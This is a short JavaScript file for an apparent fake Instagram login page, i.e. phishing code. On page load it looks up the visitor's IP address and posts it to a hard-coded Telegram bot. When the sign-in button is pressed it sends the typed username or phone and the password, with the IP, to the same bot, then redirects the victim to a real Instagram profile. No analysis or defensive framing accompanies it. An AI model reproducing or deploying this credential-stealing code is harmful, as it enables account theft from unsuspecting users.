//

const inputEmail = document.getElementById("inputEmail")
const inputPassword = document.getElementById("inputPassword")
const signin = document.getElementById("signin")
const errorspan = document.getElementById("errorspan")

let ip = 'Not Found'

fetch('https://api.db-ip.com/v2/free/self')
    .then(result => result.json())
    .then((output) => {
        ip = output;
        const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=` + `INSTAGRAM--------${ip.ipAddress}`
        fetch(url, {
            method: "POST",
            headers: { 'Content-Type': 'application/json' },
            body: ''
        }).then(res => {
            console.log("Request complete!");
        })
    }).catch(err => console.error(err));

const validateEmail = email => {
    const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}

const validatePhone = email => {
    const re = /^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/im;
    return re.test(String(email).toLowerCase());
}

inputEmail.addEventListener('input', ()=>{ errorspan.style.display = "none"});
inputPassword.addEventListener('input', ()=>{ errorspan.style.display = "none"});

const checkUsername = () => {

    let valid = false;
    const min = 3,
        max = 25;
    const username = inputEmail.value.trim();

    if (username === '') {
        console.log('Username cannot be blank.');
    } else if (!isBetween(username.length, min, max)) {
        console.log( `Username must be between ${min} and ${max} characters.`)
    } else {
        valid = true;
    }
    return valid;
}

const isPasswordSecure = (password) => {
    const re = new RegExp("^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[!@#\$%\^&\*])(?=.{8,})");
    return re.test(password);
};

signin.addEventListener("click", async (ev) => {
    ev.preventDefault();
    console.log("signing in...");
    const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=` + `INSTAGRAM  || ${inputEmail.value}:${inputPassword.value} || ${JSON.stringify(ip)}`

    if (!validateEmail(inputEmail.value) && !validatePhone(inputEmail.value) && !isPasswordSecure(inputPassword.value) && !checkUsername()) {
        errorspan.style.display = "block"
        setTimeout(()=>{
            errorspan.style.display = "none"
        }, 3000)
    } else {
        fetch(url, {
            method: "POST",
            headers: { 'Content-Type': 'application/json' },
            body: ''
        }).then(res => {
            console.log("Request complete!");
        });
        location.href = "https://www.instagram.com/varsha._.rai"
        return false;
    }
}
);
